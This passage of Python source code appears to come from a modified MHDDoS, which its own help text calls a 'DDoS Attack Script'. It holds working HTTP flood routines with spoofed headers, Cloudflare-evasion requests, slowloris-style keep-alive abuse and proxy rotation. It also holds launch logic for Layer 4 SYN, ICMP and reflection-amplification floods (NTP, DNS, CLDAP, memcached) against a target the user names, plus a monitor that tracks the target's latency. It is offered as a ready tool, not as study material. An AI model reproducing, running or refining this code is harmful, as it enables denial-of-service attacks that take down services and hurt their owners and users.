                sleep(max(self._rpc / 1000, 1))
                Tools.send(s, payload)
        Tools.safe_close(s)

    def DGB(self) -> None:
        global REQUESTS_SENT, BYTES_SEND
        with suppress(Exception):
            if self._proxy_pool:
                pro = self._proxy_pool.get_proxy()
                if pro:
                    with Tools.dgb_solver(
                        self._target.human_repr(),
                        randchoice(self._useragents),
                        pro.asRequest(),
                    ) as ss:
                        for _ in range(min(self._rpc, 5)):
                            sleep(min(self._rpc, 5) / 100)
                            with ss.get(
                                self._target.human_repr(),
                                proxies=pro.asRequest(),
                                timeout=5,
                            ) as res:
                                REQUESTS_SENT += 1
                                BYTES_SEND += Tools.sizeOfRequest(res)
                                continue
                    Tools.safe_close(ss)
                    return
            with Tools.dgb_solver(
                self._target.human_repr(), randchoice(self._useragents)
            ) as ss:
                for _ in range(min(self._rpc, 5)):
                    sleep(min(self._rpc, 5) / 100)
                    with ss.get(self._target.human_repr(), timeout=5) as res:
                        REQUESTS_SENT += 1
                        BYTES_SEND += Tools.sizeOfRequest(res)
            Tools.safe_close(ss)

    def DYN(self) -> None:
        payload = str.encode(
            self._payload
            + f"Host: {ProxyTools.Random.rand_str(6)}.{self._target.authority}\r\n"
            + self.randHeadercontent
            + "\r\n"
        )
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def DOWNLOADER(self) -> None:
        payload = self.generate_payload()
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
                while 1:
                    sleep(0.01)
                    data = s.recv(1)
                    if not data:
                        break
            Tools.send(s, b"0")
        Tools.safe_close(s)

    def BYPASS(self) -> None:
        global REQUESTS_SENT, BYTES_SEND
        pro = self._proxy_pool.get_proxy() if self._proxy_pool else None
        s = None
        with suppress(Exception), Session() as s:
            for _ in range(self._rpc):
                if pro:
                    with s.get(
                        self._target.human_repr(), proxies=pro.asRequest(), timeout=5
                    ) as res:
                        REQUESTS_SENT += 1
                        BYTES_SEND += Tools.sizeOfRequest(res)
                        continue
                with s.get(self._target.human_repr(), timeout=5) as res:
                    REQUESTS_SENT += 1
                    BYTES_SEND += Tools.sizeOfRequest(res)
        Tools.safe_close(s)

    def GSB(self) -> None:
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                payload = str.encode(
                    "%s %s?qs=%s HTTP/1.1\r\nHost: %s\r\n%sAccept-Encoding: gzip, deflate, br\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\nSec-Fetch-Dest: document\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Site: none\r\nSec-Fetch-User: ?1\r\nSec-Gpc: 1\r\nPragma: no-cache\r\nUpgrade-Insecure-Requests: 1\r\n\r\n"
                    % (
                        self._req_type,
                        self._target.raw_path_qs,
                        ProxyTools.Random.rand_str(6),
                        self._target.authority,
                        self.randHeadercontent,
                    )
                )
                Tools.send(s, payload)
        Tools.safe_close(s)

    def RHEX(self) -> None:
        randhex = str(randbytes(randchoice([32, 64, 128])))
        payload = str.encode(
            "%s %s/%s HTTP/1.1\r\nHost: %s/%s\r\n%sAccept-Encoding: gzip, deflate, br\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: keep-alive\r\nSec-Fetch-Dest: document\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Site: none\r\nSec-Fetch-User: ?1\r\nSec-Gpc: 1\r\nPragma: no-cache\r\nUpgrade-Insecure-Requests: 1\r\n\r\n"
            % (
                self._req_type,
                self._target.authority,
                randhex,
                self._target.authority,
                randhex,
                self.randHeadercontent,
            )
        )
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def STOMP(self) -> None:
        dep = (
            "Accept-Encoding: gzip, deflate, br\r\n"
            "Accept-Language: en-US,en;q=0.9\r\n"
            "Cache-Control: max-age=0\r\n"
            "Connection: keep-alive\r\n"
            "Sec-Fetch-Dest: document\r\n"
            "Sec-Fetch-Mode: navigate\r\n"
            "Sec-Fetch-Site: none\r\n"
            "Sec-Fetch-User: ?1\r\n"
            "Sec-Gpc: 1\r\n"
            "Pragma: no-cache\r\n"
            "Upgrade-Insecure-Requests: 1\r\n\r\n"
        )
        hexh = r"\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA "
        p1, p2 = (
            str.encode(
                "%s %s/%s HTTP/1.1\r\nHost: %s/%s\r\n%s%s"
                % (
                    self._req_type,
                    self._target.authority,
                    hexh,
                    self._target.authority,
                    hexh,
                    self.randHeadercontent,
                    dep,
                )
            ),
            str.encode(
                "%s %s/cdn-cgi/l/chk_captcha HTTP/1.1\r\nHost: %s\r\n%s%s"
                % (
                    self._req_type,
                    self._target.authority,
                    hexh,
                    self.randHeadercontent,
                    dep,
                )
            ),
        )
        s = None
        with suppress(Exception), self.open_connection() as s:
            Tools.send(s, p1)
            for _ in range(self._rpc):
                Tools.send(s, p2)
        Tools.safe_close(s)

    def NULL(self) -> None:
        payload = str.encode(
            self._payload
            + f"Host: {self._target.authority}\r\n"
            + "User-Agent: null\r\n"
            + "Referrer: null\r\n"
            + self.SpoofIP
            + "\r\n"
        )
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def BOMB(self) -> None:
        if not self._proxy_pool or len(self._proxy_pool) == 0:
            exit("This method requires proxies.")
        while True:
            proxy = self._proxy_pool.get_proxy()
            if proxy and proxy.type != ProxyType.SOCKS4:
                break
        with suppress(Exception):
            res = run(
                [
                    f"{bombardier_path}",
                    f"--connections={self._rpc}",
                    "--http2",
                    "--method=GET",
                    "--latencies",
                    "--timeout=30s",
                    f"--requests={self._rpc}",
                    f"--proxy={proxy}",
                    f"{self._target.human_repr()}",
                ],
                stdout=PIPE,
                stderr=PIPE,
            )
            if self._thread_id == 0 and res.stdout:
                print(proxy, res.stdout.decode(), sep="\n")

    def SLOW(self) -> None:
        payload = self.generate_payload()
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
            while Tools.send(s, payload) and s.recv(1):
                for i in range(self._rpc):
                    keep = str.encode(
                        "X-a: %d\r\n" % ProxyTools.Random.rand_int(1, 5000)
                    )
                    Tools.send(s, keep)
                    sleep(self._rpc / 15)
                    break
        Tools.safe_close(s)


class ProxyManager:
    @staticmethod
    def DownloadFromConfig(cf, Proxy_type: int) -> Set[Proxy]:
        providrs = [
            provider
            for provider in cf["proxy-providers"]
            if provider["type"] == Proxy_type or Proxy_type == 0
        ]
        logger.info(
            f"{bcolors.WARNING}Downloading Proxies from {bcolors.OKBLUE}%d{bcolors.WARNING} Providers{bcolors.RESET}"
            % len(providrs)
        )
        proxes: Set[Proxy] = set()
        with ThreadPoolExecutor(len(providrs)) as executor:
            future_to_download = {
                executor.submit(
                    ProxyManager.download,
                    provider,
                    (
                        ProxyType.stringToProxyType(str(provider["type"]))
                        if provider["type"] != 0
                        else None
                    ),
                )
                for provider in providrs
            }
            for future in as_completed(future_to_download):
                for pro in future.result():
                    if Proxy_type != 0 and pro.type != ProxyType.stringToProxyType(
                        str(Proxy_type)
                    ):
                        continue  # Skip mismatched types if user requested specific protocol
                    proxes.add(pro)
        return proxes

    @staticmethod
    def download(provider, proxy_type: Optional[ProxyType]) -> Set[Proxy]:
        type_name = proxy_type.name if proxy_type else "ALL"
        url_or_path = provider["url"]
        logger.debug(
            f"{bcolors.WARNING}Proxies from (Source: {bcolors.OKBLUE}%s{bcolors.WARNING}, Type: {bcolors.OKBLUE}%s{bcolors.WARNING}){bcolors.RESET}"
            % (url_or_path, type_name)
        )
        proxes: Set[Proxy] = set()
        data = ""

        try:
            if str(url_or_path).startswith("http://") or str(url_or_path).startswith(
                "https://"
            ):
                data = get(url_or_path, timeout=provider["timeout"]).text
            else:
                p = Path(url_or_path)
                if p.exists() and p.is_file():
                    with p.open("r", encoding="utf-8", errors="ignore") as f:
                        data = f.read()
                else:
                    logger.error(f"[!] Source not found or invalid: {url_or_path}")
                    return proxes

            if proxy_type:
                for proxy in ProxyUtiles.parseAllIPPort(data.splitlines(), proxy_type):
                    proxes.add(proxy)
            else:
                for line in data.splitlines():
                    p = Proxy.fromString(line.strip())
                    if p:
                        proxes.add(p)
        except Exception as e:
            logger.error(f"Download Proxy Error: {(e.__str__() or e.__repr__())}")
        return proxes


class ToolsConsole:
    METHODS = {"INFO", "TSSRV", "CFIP", "DNS", "PING", "CHECK", "DSTAT"}

    @staticmethod
    def checkRawSocket():
        with suppress(OSError):
            with socket(AF_INET, SOCK_RAW, IPPROTO_TCP):
                return True
        return False

    @staticmethod
    def runConsole():
        cons = f"{gethostname()}@MHTools:~#"
        while 1:
            cmd = input(cons + " ").strip()
            if not cmd:
                continue
            if " " in cmd:
                cmd, args = cmd.split(" ", 1)
            cmd = cmd.upper()
            if cmd == "HELP":
                print("Tools:" + ", ".join(ToolsConsole.METHODS))
                print("Commands: HELP, CLEAR, BACK, EXIT")
                continue
            if {cmd} & {"E", "EXIT", "Q", "QUIT", "LOGOUT", "CLOSE"}:
                exit(-1)
            if cmd == "CLEAR":
                print("\033c")
                continue
            if not {cmd} & ToolsConsole.METHODS:
                print(f"{cmd} command not found")
                continue
            if cmd == "DSTAT":
                with suppress(KeyboardInterrupt):
                    ld = net_io_counters(pernic=False)
                    while True:
                        sleep(1)
                        od, ld = ld, net_io_counters(pernic=False)
                        t = [(last - now) for now, last in zip(od, ld)]
                        logger.info(
                            (
                                "Bytes Sent %s\n"
                                "Bytes Received %s\n"
                                "Packets Sent %s\n"
                                "Packets Received %s\n"
                                "ErrIn %s\n"
                                "ErrOut %s\n"
                                "DropIn %s\n"
                                "DropOut %s\n"
                                "Cpu Usage %s\n"
                                "Memory %s\n"
                            )
                            % (
                                Tools.humanbytes(t[0]),
                                Tools.humanbytes(t[1]),
                                Tools.humanformat(t[2]),
                                Tools.humanformat(t[3]),
                                t[4],
                                t[5],
                                t[6],
                                t[7],
                                str(cpu_percent()) + "%",
                                str(virtual_memory().percent) + "%",
                            )
                        )
            if cmd in ["CFIP", "DNS"]:
                print("Soon")
                continue
            if cmd == "CHECK":
                while True:
                    with suppress(Exception):
                        domain = input(f"{cons}give-me-ipaddress# ")
                        if not domain:
                            continue
                        if domain.upper() == "BACK":
                            break
                        if domain.upper() == "CLEAR":
                            print("\033c")
                            continue
                        if {domain.upper()} & {
                            "E",
                            "EXIT",
                            "Q",
                            "QUIT",
                            "LOGOUT",
                            "CLOSE",
                        }:
                            exit(-1)
                        if "/" not in domain:
                            continue
                        logger.info("please wait ...")
                        with get(domain, timeout=20) as r:
                            logger.info(
                                ("status_code: %d\nstatus: %s")
                                % (
                                    r.status_code,
                                    "ONLINE" if r.status_code <= 500 else "OFFLINE",
                                )
                            )
            if cmd == "INFO":
                while True:
                    domain = input(f"{cons}give-me-ipaddress# ")
                    if not domain:
                        continue
                    if domain.upper() == "BACK":
                        break
                    if domain.upper() == "CLEAR":
                        print("\033c")
                        continue
                    if {domain.upper()} & {"E", "EXIT", "Q", "QUIT", "LOGOUT", "CLOSE"}:
                        exit(-1)
                    domain = domain.replace("https://", "").replace("http://", "")
                    if "/" in domain:
                        domain = domain.split("/")[0]
                    print("please wait ...", end="\r")
                    info = ToolsConsole.info(domain)
                    if not info["success"]:
                        print("Error!")
                        continue
                    logger.info(
                        ("Country: %s\nCity: %s\nOrg: %s\nIsp: %s\nRegion: %s\n")
                        % (
                            info["country"],
                            info["city"],
                            info["org"],
                            info["isp"],
                            info["region"],
                        )
                    )
            if cmd == "TSSRV":
                while True:
                    domain = input(f"{cons}give-me-domain# ")
                    if not domain:
                        continue
                    if domain.upper() == "BACK":
                        break
                    if domain.upper() == "CLEAR":
                        print("\033c")
                        continue
                    if {domain.upper()} & {"E", "EXIT", "Q", "QUIT", "LOGOUT", "CLOSE"}:
                        exit(-1)
                    domain = domain.replace("https://", "").replace("http://", "")
                    if "/" in domain:
                        domain = domain.split("/")[0]
                    print("please wait ...", end="\r")
                    info = ToolsConsole.ts_srv(domain)
                    logger.info(f"TCP: {(info['_tsdns._tcp.'])}\n")
                    logger.info(f"UDP: {(info['_ts3._udp.'])}\n")
            if cmd == "PING":
                while True:
                    domain = input(f"{cons}give-me-ipaddress# ")
                    if not domain:
                        continue
                    if domain.upper() == "BACK":
                        break
                    if domain.upper() == "CLEAR":
                        print("\033c")
                    if {domain.upper()} & {"E", "EXIT", "Q", "QUIT", "LOGOUT", "CLOSE"}:
                        exit(-1)
                    domain = domain.replace("https://", "").replace("http://", "")
                    if "/" in domain:
                        domain = domain.split("/")[0]
                    logger.info("please wait ...")
                    r = ping(domain, count=5, interval=0.2)
                    logger.info(
                        ("Address: %s\nPing: %d\nAceepted Packets: %d/%d\nstatus: %s\n")
                        % (
                            r.address,
                            r.avg_rtt,
                            r.packets_received,
                            r.packets_sent,
                            "ONLINE" if r.is_alive else "OFFLINE",
                        )
                    )

    @staticmethod
    def stop():
        print("All Attacks has been Stopped !")
        for proc in process_iter():
            if proc.name() == "python.exe":
                proc.kill()

    @staticmethod
    def usage():
        print(
            (
                f"* MHDDoS v{__version__} - DDoS Attack Script With %d Methods\n"
                "Note: If the Proxy list is empty, The attack will run without proxies\n"
                "      If the Proxy file doesn't exist, the script will download proxies and check them.\n"
                "      Proxy Type 0 = All in config.json\n"
                "      SocksTypes:\n"
                "         - 6 = RANDOM\n"
                "         - 5 = SOCKS5\n"
                "         - 4 = SOCKS4\n"
                "         - 1 = HTTP\n"
                "         - 0 = ALL\n"
                " > Methods:\n"
                " - Layer4\n"
                " | %s | %d Methods\n"
                " - Layer7\n"
                " | %s | %d Methods\n"
                " - Tools\n"
                " | %s | %d Methods\n"
                " - Others\n"
                " | %s | %d Methods\n"
                " - All %d Methods\n"
                "\n"
                "Example:\n"
                "   L7: python3 %s <method> <url> <socks_type> <threads> <proxylist> <rpc> <duration> <refresh=optional>\n"
                "   L4: python3 %s <method> <ip:port> <threads> <duration>\n"
                "   L4 Proxied: python3 %s <method> <ip:port> <threads> <duration> <socks_type> <proxylist> <refresh=optional>\n"
                "   L4 Amplification: python3 %s <method> <ip:port> <threads> <duration> <reflector file (only use with"
                " Amplification)>\n"
            )
            % (
                len(Methods.ALL_METHODS) + 3 + len(ToolsConsole.METHODS),
                ", ".join(Methods.LAYER4_METHODS),
                len(Methods.LAYER4_METHODS),
                ", ".join(Methods.LAYER7_METHODS),
                len(Methods.LAYER7_METHODS),
                ", ".join(ToolsConsole.METHODS),
                len(ToolsConsole.METHODS),
                ", ".join(["TOOLS", "HELP", "STOP"]),
                3,
                len(Methods.ALL_METHODS) + 3 + len(ToolsConsole.METHODS),
                argv[0],
                argv[0],
                argv[0],
                argv[0],
            )
        )

    @staticmethod
    def ts_srv(domain):
        records, DnsResolver, Info = (
            ["_ts3._udp.", "_tsdns._tcp."],
            resolver.Resolver(),
            {},
        )
        DnsResolver.timeout, DnsResolver.lifetime = 1, 1
        for rec in records:
            try:
                srv_records = resolver.resolve(rec + domain, "SRV")
                for srv in srv_records:
                    Info[rec] = str(srv.target).rstrip(".") + ":" + str(srv.port)
            except:
                Info[rec] = "Not found"
        return Info

    @staticmethod
    def info(domain):
        with suppress(Exception), get(f"https://ipwhois.app/json/{domain}/") as s:
            return s.json()
        return {"success": False}


def handleProxyList(con, proxy_arg, proxy_ty, url=None):
    if proxy_ty not in {4, 5, 1, 0, 6}:
        exit("Socks Type Not Found [4, 5, 1, 0, 6]")
    
    if proxy_ty == 6:
        proxy_ty = randchoice([4, 5, 1])
        
    proxies = set()
    is_remote = str(proxy_arg).startswith(("http://", "https://"))
    
    if is_remote:
        logger.info(f"{bcolors.WARNING}[*] Resource: Synchronizing remote tactical assets from {bcolors.OKBLUE}{proxy_arg}{bcolors.RESET}")
        try:
            res = get(str(proxy_arg), timeout=15)
            if res.status_code != 200:
                raise Exception(f"HTTP {res.status_code}")
            
            data = res.text
            if proxy_ty == 0:
                for line in data.splitlines():
                    p = Proxy.fromString(line.strip())
                    if p: proxies.add(p)
            else:
                proxy_type_obj = ProxyType.stringToProxyType(str(proxy_ty))
                # Efficient Regex Parsing
                ip_port_pattern = re.compile(r"(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}):(\d+)")
                for match in ip_port_pattern.finditer(data):
                    proxies.add(Proxy(match.group(1), int(match.group(2)), proxy_type_obj))
            
            if not proxies:
                logger.warning(f"{bcolors.WARNING}[!] Resource: Tactical failure - No active resources found at origin.{bcolors.RESET}")
            else:
                logger.info(f"{bcolors.OKGREEN}[*] Resource: Deployment successful. {len(proxies):,} active endpoints synchronized.{bcolors.RESET}")
        except Exception as e:
            logger.error(f"[!] Handshake Failed: {e}")
            if "ReloadSentinel" not in current_thread().name:
                exit(f"Origin Unreachable: {e}")
            return set()
    else:
        proxy_li = Path(proxy_arg)
        is_sentinel = "ReloadSentinel" in current_thread().name
        force_harvest = proxy_li.name == "auto_harvest.txt"
        
        if not proxy_li.exists() or force_harvest:
            if proxy_li.name == "auto_harvest.txt":
                action_type = "Refreshing" if is_sentinel else "Scraping"
                logger.info(f"{bcolors.OKCYAN}[*] Auto-Harvest: {action_type} global tactical matrices. Please stand by...{bcolors.RESET}")
            else:
                logger.warning(f"{bcolors.WARNING}[!] Resource: Local asset missing. Initializing emergency fallback sequence.{bcolors.RESET}")
            
            proxy_li.parent.mkdir(parents=True, exist_ok=True)
            all_raw_proxies = ProxyManager.DownloadFromConfig(con, proxy_ty)
            
            if not all_raw_proxies:
                if is_sentinel: return set()
                exit("Tactical Matrix Depleted. Check uplink.")
                
            total_found = len(all_raw_proxies)
            logger.info(f"{bcolors.OKBLUE}[*] Resource: Validation protocol initiated for {total_found:,} raw tactical assets...{bcolors.RESET}")
            
            # Use PyRoxy for checking
            validated_proxies = ProxyChecker.checkAll(
                all_raw_proxies,
                timeout=3,
                threads=min(500, total_found),
                url=url.human_repr() if url else "http://httpbin.org/get",
            )
            
            if not validated_proxies:
                if is_sentinel:
                    logger.error(f"{bcolors.FAIL}[!] Sentinel: Harvest failed. Retaining current tactical pool.{bcolors.RESET}")
                    return ProxyUtiles.readFromFile(proxy_li)
                exit("Resource Validation Failed. Tactical assets purged - check uplink.")
            
            efficiency = round(len(validated_proxies) / total_found * 100, 1) if total_found > 0 else 0
            logger.info(f"{bcolors.OKGREEN}[*] Resource: Validation complete. Usable: {len(validated_proxies):,} / Total: {total_found:,} ({efficiency}% efficiency).{bcolors.RESET}")
            
            with proxy_li.open("w", encoding="utf-8") as wr:
                wr.write("\n".join(str(p) for p in validated_proxies))
            
            proxies = validated_proxies
        else:
            proxies = ProxyUtiles.readFromFile(proxy_li)
            if proxies:
                logger.info(f"{bcolors.OKGREEN}[*] Resource: {len(proxies):,} local endpoints active.{bcolors.RESET}")
            else:
                logger.warning(f"{bcolors.WARNING}[!] Resource: Local asset pool empty. Tactical profile limited.{bcolors.RESET}")
                
    return proxies



if __name__ == "__main__":
    with suppress(KeyboardInterrupt):
        try:
            one = argv[1].upper()
            if one == "HELP":
                raise IndexError()
            if one == "TOOLS":
                ToolsConsole.runConsole()
            if one == "STOP":
                ToolsConsole.stop()
            method, event, proxy_pool, refresh_mins = one, Event(), TacticalProxyPool(), 0
            event.clear()
            urlraw = argv[2].strip()
            if not urlraw.startswith("http"):
                urlraw = "http://" + urlraw
            if method not in Methods.ALL_METHODS:
                exit("Method Not Found %s" % ", ".join(Methods.ALL_METHODS))

            target_host = "Unknown"
            port = 80
            threads = 1
            timer = 3600

            if method in Methods.LAYER7_METHODS:
                url = URL(urlraw)
                target_host = url.host
                host = target_host
                if method != "TOR":
                    try:
                        host = gethostbyname(target_host)
                    except Exception as e:
                        exit("Hostname Unresolved: ", target_host, str(e))
                proxy_ty, threads, proxy_arg, rpc, timer = (
                    int(argv[3]),
                    int(argv[4]),
                    argv[5].strip(),
                    int(argv[6]),
                    int(argv[7]),
                )
                
                # Global Flag Detection
                for arg in argv[8:]:
                    if arg.isdigit():
                        refresh_mins = int(arg)
                    elif arg == "--autoscale":
                        ENGINE_STATE.active_threads_target.value = threads
                    elif arg == "--evasion":
                        pass # Detected via argv check in HttpFlood.run()

                proxy_li = (
                    proxy_arg
                    if proxy_arg.startswith("http")
                    else Path(__dir__ / "files/proxies/" / proxy_arg)
                )
                useragent_li, referers_li, bombardier_path = (
                    Path(__dir__ / "files/useragent.txt"),
                    Path(__dir__ / "files/referers.txt"),
                    Path.home() / "go/bin/bombardier",
                )
                if method == "BOMB":
                    assert (
                        bombardier_path.exists()
                        or bombardier_path.with_suffix(".exe").exists()
                    ), "Install bombardier: https://github.com/MHProDev/MHDDoS/wiki/BOMB-method"
                if not useragent_li.exists() or not referers_li.exists():
                    exit("Critical Assets Missing (UA/Ref)")
                uagents = set(a.strip() for a in useragent_li.open("r+").readlines())
                referers = set(a.strip() for a in referers_li.open("r+").readlines())
                if not uagents or not referers:
                    exit("Critical Assets Empty")
                proxies = handleProxyList(con, proxy_li, proxy_ty, url)
                if proxies:
                    tactical_proxies = TacticalProxyValidator.validate_and_score(set(proxies), str(url) if url else None, is_layer7=True)
                    proxy_pool.update_pool(tactical_proxies)
                else:
                    proxy_pool.update_pool([])
                
                if refresh_mins > 0:
                    logger.info(f"{bcolors.OKCYAN}[*] Sentinel: Initializing background refresh protocols ({refresh_mins}m)...{bcolors.RESET}")
                    ReloadSentinel(
                        refresh_mins, con, proxy_li, proxy_ty, proxy_pool, url
                    ).start()
                
                logger.info(f"{bcolors.OKBLUE}[*] Tactical Engine: Deploying {threads:,} L7 worker threads...{bcolors.RESET}")
                for thread_id in range(threads):
                    HttpFlood(
                        thread_id,
                        url,
                        host,
                        method,
                        rpc,
                        event,
                        uagents,
                        referers,
                        proxy_pool,
                    ).start()

            elif method in Methods.LAYER4_METHODS:
                target = URL(urlraw)
                port, target_host = target.port, target.host
                host = target_host
                try:
                    host = gethostbyname(target_host)
                except Exception as e:
                    exit("Hostname Unresolved: ", target_host, str(e))
                if not port:
                    logger.warning("[!] Port Missing. Defaulting to 80.")
                    port = 80
                if port > 65535 or port < 1:
                    exit("Invalid Port Configuration")
                if (
                    method
                    in {
                        "NTP",
                        "DNS",
                        "RDP",
                        "CHAR",
                        "MEM",
                        "CLDAP",
                        "ARD",
                        "SYN",
                        "ICMP",
                    }
                    and not ToolsConsole.checkRawSocket()
                ):
                    exit("Raw Socket Privilege Required")
                threads, timer, ref = int(argv[3]), int(argv[4]), None
                
                # Dynamic Flag Detection for L4
                for arg in argv[5:]:
                    if arg == "--autoscale":
                        ENGINE_STATE.active_threads_target.value = threads
                    elif arg == "--evasion":
                        pass

                if len(argv) >= 6:
                    argfive = argv[5].strip()
                    if argfive and not argfive.startswith("--"):
                        refl_li = Path(__dir__ / "files" / argfive)
                        if method in {
                            "NTP",
                            "DNS",
                            "RDP",
                            "CHAR",
                            "MEM",
                            "CLDAP",
                            "ARD",
                        }:
                            if not refl_li.exists():
                                exit("Reflector Asset Missing")
                            ref = set(
                                a.strip()
                                for a in Tools.IP.findall(refl_li.open("r").read())
                            )
                            if not ref:
                                exit("Reflector Asset Empty")
                        elif argfive.isdigit() and len(argv) >= 7:
                            proxy_ty, proxy_arg = int(argfive), argv[6].strip()
                            if len(argv) >= 8 and argv[7].isdigit():
                                refresh_mins = int(argv[7])
                            proxy_li = (
                                proxy_arg
                                if proxy_arg.startswith("http")
                                else Path(__dir__ / "files/proxies" / proxy_arg)
                            )
                            proxies = handleProxyList(con, proxy_li, proxy_ty)
                            if proxies:
                                tactical_proxies = TacticalProxyValidator.validate_and_score(set(proxies), is_layer7=False)
                                proxy_pool.update_pool(tactical_proxies)
                            else:
                                proxy_pool.update_pool([])
                            
                            if refresh_mins > 0:
                                logger.info(f"{bcolors.OKCYAN}[*] Sentinel: Initializing background refresh protocols ({refresh_mins}m)...{bcolors.RESET}")
                                ReloadSentinel(
                                    refresh_mins, con, proxy_li, proxy_ty, proxy_pool
                                ).start()
                            
                            if method not in {
                                "MINECRAFT",
                                "MCBOT",
                                "TCP",
                                "CPS",
                                "CONNECTION",
                            }:
                                exit("Layer 4 Proxy Incompatibility")
                protocolid = con["MINECRAFT_DEFAULT_PROTOCOL"]
                if method == "MCBOT":
                    with suppress(Exception), socket(AF_INET, SOCK_STREAM) as s:
                        Tools.send(s, Minecraft.handshake((host, port), protocolid, 1))
                        Tools.send(s, Minecraft.data(b"\x00"))
                        pid = Tools.protocolRex.search(str(s.recv(1024)))
                        protocolid = (
                            con["MINECRAFT_DEFAULT_PROTOCOL"]
                            if not pid
                            else int(pid.group(1))
                        )
                        if 47 < protocolid > 758:
                            protocolid = con["MINECRAFT_DEFAULT_PROTOCOL"]
                
                logger.info(f"{bcolors.OKBLUE}[*] Tactical Engine: Deploying {threads:,} L4 worker threads...{bcolors.RESET}")
                for thread_id in range(threads):
                    Layer4(
                        (host, port), ref, method, event, proxy_pool, protocolid
                    ).start()

            logger.info(
                f"{bcolors.OKGREEN}[*] COMMAND LAUNCHED: Target: {target_host} | Method: {method} | Duration: {timer}s | Workers: {threads}{bcolors.RESET}"
            )
            event.set()
            ts = time()

            # Start Health Monitor
            hm = HealthMonitor(
                target_host, port, "L7" if method in Methods.LAYER7_METHODS else "L4"
            )
            hm.start()

            while time() < ts + timer:
                lat_str = (
                    f"{CURRENT_LATENCY.value:.1f}ms"
                    if CURRENT_LATENCY.value > 0
                    else "TIMEOUT"
                )
                logger.info(
                    "Target: %s, Port: %s, Method: %s PPS: %s, BPS: %s, Latency: %s / %d%%"
                    % (
                        target_host,
                        port,
                        method,
                        Tools.humanformat(int(REQUESTS_SENT)),
                        Tools.humanbytes(int(BYTES_SEND)),
                        lat_str,
                        round((time() - ts) / timer * 100, 2),
                    )
                )
                REQUESTS_SENT.set(0)
                BYTES_SEND.set(0)
                sleep(1)
            event.clear()
            exit()
        except (IndexError, ValueError):
            ToolsConsole.usage()
        except Exception as e:
            import traceback
            logger.error(f"{bcolors.FAIL}[!] ENGINE_CRASH: Critical Failure during deployment.{bcolors.RESET}")
            logger.error(f"{bcolors.FAIL}[!] ERROR_DETAILS: {str(e)}{bcolors.RESET}")
            logger.error(bcolors.FAIL + traceback.format_exc() + bcolors.RESET)
            exit()
